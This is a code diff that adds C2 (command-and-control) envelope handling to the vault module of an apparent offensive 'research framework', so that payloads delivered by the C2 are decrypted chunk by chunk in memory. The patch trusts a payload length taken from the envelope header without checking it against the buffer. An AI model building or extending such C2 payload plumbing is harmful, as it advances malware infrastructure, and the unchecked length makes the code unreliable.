@@ -8,6 +8,7 @@
  */
 
 #include "vault.h"
+#include "../c2_comms/c2_client.h"
 #include "../common/config.h"
 #include "../common/logging.h"
 
@@ -89,9 +90,14 @@ aegis_result_t aegis_vault_init(aegis_vault_ctx_t *ctx,
   /* Calculate chunk count */
   /* Each "logical chunk" in the vault is: chunk_header + encrypted_data */
   /* For raw encrypted blobs, we treat the entire thing as a single
-     addressable region and chunk it based on chunk_size */
+     addressable region and chunk it based on chunk_size.
+     We must skip the C2 envelope when calculating the usable data size. */
+  size_t pt_len = data_len;
+  if (data_len > sizeof(aegis_c2_envelope_t)) {
+    pt_len = ((const aegis_c2_envelope_t *)encrypted_data)->payload_len;
+  }
   ctx->total_chunks =
-      (uint32_t)((data_len + ctx->chunk_size - 1) / ctx->chunk_size);
+      (uint32_t)((pt_len + ctx->chunk_size - 1) / ctx->chunk_size);
 
   aegis_log_memory_map(ctx->log, "mmap", ctx->data, alloc_size, -1,
                        PROT_READ | PROT_WRITE,
@@ -188,27 +194,68 @@ aegis_result_t aegis_vault_get_chunk(aegis_vault_ctx_t *ctx, uint32_t chunk_id,
 
   /*
    * For a fully integrated system, each chunk would have its own
-   * IV and tag prepended.  In this implementation, we decrypt
-   * the chunk using IV derived from the chunk_id.
+   * IV and tag prepended.  In this implementation, we extract
+   * the C2 envelope from the start of the payload data to get
+   * the original encryption parameters.
    */
-  uint8_t chunk_iv[AEGIS_GCM_IV_BYTES];
-  memset(chunk_iv, 0, sizeof(chunk_iv));
-  chunk_iv[0] = (uint8_t)(chunk_id >> 24);
-  chunk_iv[1] = (uint8_t)(chunk_id >> 16);
-  chunk_iv[2] = (uint8_t)(chunk_id >> 8);
-  chunk_iv[3] = (uint8_t)(chunk_id);
-  /* Remaining bytes stay zero — unique per chunk */
+  const aegis_c2_envelope_t *env = (const aegis_c2_envelope_t *)raw_encrypted;
 
   /*
-   * In production, each chunk would be individually encrypted.
-   * For the research framework, we copy the raw chunk and log it.
-   * The full encryption/decryption would use:
-   *   aegis_decrypt(ctx->crypto, chunk_data, chunk_len, ...)
+   * Decrypt the chunk using the parameters provided by the C2.
+   * We use aegis_decrypt_no_advance to ensure internal vault
+   * operations do NOT desynchronize the main C2 communication state.
    */
-  memcpy(output, raw_encrypted + offset, this_chunk_len);
+  size_t pt_len = env->payload_len;
+  uint8_t *full_plaintext = malloc(pt_len + 16);
+  if (!full_plaintext) {
+    if (unwrapped) {
+      AEGIS_ZERO(unwrapped, ctx->data_len);
+      free(unwrapped);
+    }
+    return AEGIS_ERR_ALLOC;
+  }
+
+  aegis_c2_envelope_t aad_env;
+  memcpy(&aad_env, env, sizeof(aegis_c2_envelope_t));
+  memset(aad_env.iv, 0, AEGIS_GCM_IV_BYTES);
+  memset(aad_env.tag, 0, AEGIS_GCM_TAG_BYTES);
+
+  aegis_result_t rc = aegis_decrypt_no_advance(
+      ctx->crypto, raw_encrypted + sizeof(aegis_c2_envelope_t), pt_len,
+      (const uint8_t *)&aad_env, sizeof(aegis_c2_envelope_t), env->iv, env->tag,
+      full_plaintext);
+
+  if (rc != AEGIS_OK) {
+    AEGIS_ZERO(full_plaintext, pt_len + 16);
+    free(full_plaintext);
+    if (unwrapped) {
+      AEGIS_ZERO(unwrapped, ctx->data_len);
+      free(unwrapped);
+    }
+    return rc;
+  }
+
+  /* Extract the requested chunk from the decrypted payload */
+  if (offset >= pt_len) {
+    AEGIS_ZERO(full_plaintext, pt_len + 16);
+    free(full_plaintext);
+    if (unwrapped) {
+      AEGIS_ZERO(unwrapped, ctx->data_len);
+      free(unwrapped);
+    }
+    return AEGIS_ERR_VAULT;
+  }
+
+  if (offset + this_chunk_len > pt_len)
+    this_chunk_len = pt_len - offset;
+
+  memcpy(output, full_plaintext + offset, this_chunk_len);
   *output_len = this_chunk_len;
 
-  aegis_log_crypto(ctx->log, "decrypt", this_chunk_len, chunk_iv,
+  AEGIS_WIPE(full_plaintext, pt_len + 16, 1);
+  free(full_plaintext);
+
+  aegis_log_crypto(ctx->log, "decrypt", this_chunk_len, env->iv,
                    "Vault chunk decrypted");
 
   aegis_log_event(ctx->log, LOG_CAT_VAULT, LOG_SEV_TRACE,
